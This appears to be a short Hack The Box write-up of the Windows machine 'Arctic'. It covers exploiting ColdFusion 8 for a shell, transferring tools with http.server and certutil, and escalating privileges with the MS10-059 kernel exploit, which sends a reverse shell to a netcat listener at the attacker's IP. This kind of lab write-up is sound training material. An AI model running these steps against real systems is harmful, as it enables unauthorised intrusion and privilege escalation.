# :game_die: Htb Artic F5254Aa80770

---

This is a Windows box. You can find it [here](https://app.hackthebox.com/machines/Arctic).

*Artic*

### Skill Learned

- Exploit modification (MS10–59)

## NMAP

IP:10.10.10.11

*nmap scan*

### Port 8500

*Port 8500*

Found Adobe ColdFusion Login

*Adobe ColdFusion Login*

## Foothold/ shell

found RCE for Version 8

*searchsploit*

edit rhost, rport and lhost, lport and run the exploit.

*shell*

and we are in. Found user.txt

*user.txt*

## Priv Esc

Copy winpeasX64 to the box

*python3 -m http.server 80certutil*

and run the exe

*running winpeasx64*

not able to run the exe, might be AV is stopping us the run.

## Get anuragtaparia’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Let’s copy powerUp.ps1

For some reason, PowerShell is not also working

Let’s try windows-exploit-suggester

Copy the systeminfo output from the box and run the exploit

*running windows-exploit-suggester*

since [MS10–59](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059) is a kernel exploit let’s try it first

Let’s copy the exe to box

start the nc and run the exe

```
MS10-059.exe 10.10.14.14 1234
```

*MS10–059.exe 10.10.14.14 1234nc -nlvp 1234*

Found the root.txt

*root.txt*

---
